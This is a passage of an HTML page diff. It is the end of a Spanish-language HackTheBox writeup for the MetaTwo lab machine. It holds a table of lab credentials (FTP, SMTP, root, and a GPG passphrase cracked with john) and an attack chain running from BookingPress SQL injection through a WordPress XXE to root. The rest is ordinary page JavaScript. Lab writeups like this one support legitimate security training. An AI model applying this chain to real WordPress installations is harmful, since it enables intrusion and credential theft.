+      <tr><td>FTP</td><td><code style="color:var(--yellow)">metapress.htb:9NYS_ii@FyL_p5M2NvJ</code></td><td>XXE → <code style="color:var(--yellow)">wp-config.php</code></td></tr>
+      <tr><td>SMTP / <code style="color:var(--yellow)">jnelson</code></td><td><code style="color:var(--yellow)">Cb4_JmWM8zUZWMu@Ys</code></td><td><code style="color:var(--yellow)">mailer/send_email.php</code> en el FTP</td></tr>
+      <tr><td>passpie (GPG)</td><td><code style="color:var(--yellow)">blink182</code></td><td><code style="color:var(--yellow)">gpg2john</code> + <code style="color:var(--yellow)">john</code></td></tr>
+      <tr><td><code style="color:var(--yellow)">root</code></td><td><code style="color:var(--yellow)">p7qfAZt4_A1xo_0x</code></td><td><code style="color:var(--yellow)">passpie copy root@ssh</code></td></tr>
+      </tbody></table>
+      <div class="info-box"><p class="info-box-title">// RUTA DE ATAQUE</p><p>SQLi BookingPress → <code style="color:var(--yellow)">manager:partylikearockstar</code> → admin WP → XXE (CVE-2021-29447) → <code style="color:var(--yellow)">wp-config.php</code> → FTP → SMTP de <code style="color:var(--yellow)">jnelson</code> → SSH → user flag → passpie/GPG (<code style="color:var(--yellow)">blink182</code>) → <code style="color:var(--yellow)">su root</code> → root flag.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="referencias">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Referencias</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p>- [0xdf — MetaTwo](https://0xdf.gitlab.io/2023/04/29/htb-metatwo.html) · [sckull](https://sckull.github.io/posts/metatwo/) · [wildzarek](https://wildzarek.github.io/htb/metatwo) - CVE-2022-0739 (BookingPress SQLi) · CVE-2021-29447 (WP XXE)</p></div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="knife.html"><span class="dir">← ANTERIOR</span><span class="nombre">Knife</span></a><a class="siguiente" href="paper.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Paper</span></a></div>
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de MetaTwo · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPIAR'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => { showToast('Error al copiar'); });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "METATWO", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/metatwo.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
